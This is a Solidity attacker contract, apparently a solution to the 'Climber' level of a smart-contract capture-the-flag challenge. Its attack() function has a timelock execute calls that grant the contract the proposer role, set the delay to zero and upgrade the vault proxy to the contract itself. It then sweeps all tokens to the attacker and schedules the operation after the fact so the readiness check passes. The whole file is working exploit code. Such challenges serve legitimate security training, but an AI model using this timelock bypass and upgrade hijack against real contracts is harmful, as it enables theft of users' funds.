// SPDX-License-Identifier: NO LICENSE
pragma solidity ^0.8.0;

import "./ClimberTimelock.sol";
import "./ClimberVault.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";



contract TreeCutter is UUPSUpgradeable {
    //bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    using Address for address;

    ClimberVault private climberVault;
    ClimberTimelock private climberTimelock;
    address payable public attacker;
    address public token;


    function _authorizeUpgrade(address newImplementation) internal override { }

    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    constructor(
        address payable _climberVault,
        address payable _climberTimelock,
        address payable _attacker,
        address _token
    ) {
        climberVault = ClimberVault(_climberVault);
        climberTimelock = ClimberTimelock(_climberTimelock); 
        attacker = _attacker;
        token = _token;
        __UUPSUpgradeable_init();
    }

    // function proxiableUUID() external view virtual returns (bytes32) {
    //     return _IMPLEMENTATION_SLOT;
    // }

    function attack() external {
        require(msg.sender==attacker, "!attacker");

        bytes memory sweepData = abi.encodeWithSignature("sweepFunds(address,address)", token, address(this));

        // Construct the calldata
        address[] memory _targets = new address[](4);
        _targets[0] = address(climberTimelock);
        _targets[1] = address(climberTimelock);
        _targets[2] = address(climberVault);
        _targets[3] = address(this);

        uint256[] memory _values = new uint256[](4);

        bytes[] memory _data = new bytes[](4);
        // Grant this contract the proposer role
        _data[0] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
        // Update the delay to 0 from 1 hour
        _data[1] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        // change implementation address to this contract and call sweepFunds
        _data[2] = abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)", 
            address(this), 
            sweepData
        );

        // Match the getOperationState(id) with this call to pass .ReadyForExecution.
        // This guard is passed because of call two -> block.timeStamp + 0 == block.timestamp
        _data[3] = abi.encodeWithSignature("schedule()");

        bytes32 _salt;

        // Executes all the calls first and calls 'schedule()' lastly which
        // schedules the needed operation to pass the .ReadyForExecution guard
        climberTimelock.execute(_targets, _values, _data, _salt);

        IERC20(token).transfer(attacker, IERC20(token).balanceOf(address(this)));

    }

    function schedule() external {

        bytes memory sweepData = abi.encodeWithSignature("sweepFunds(address,address)", token, address(this));

        address[] memory _targets = new address[](4);
        _targets[0] = address(climberTimelock);
        _targets[1] = address(climberTimelock);
        _targets[2] = address(climberVault);
        _targets[3] = address(this);

        uint256[] memory _values = new uint256[](4);


        bytes[] memory _data = new bytes[](4);
        _data[0] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
        _data[1] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        _data[2] = abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)", 
            address(this), 
            sweepData
        );
        _data[3] = abi.encodeWithSignature("schedule()");

        bytes32 _salt;

        climberTimelock.schedule(_targets, _values, _data, _salt);
    }

    function sweepFunds(address tokenAddress, address to) external payable {
        IERC20 _token = IERC20(tokenAddress);
        require(_token.transfer(to, _token.balanceOf(address(this))), "Transfer failed");
    }

    receive() external payable {}
    fallback() external payable {}

}
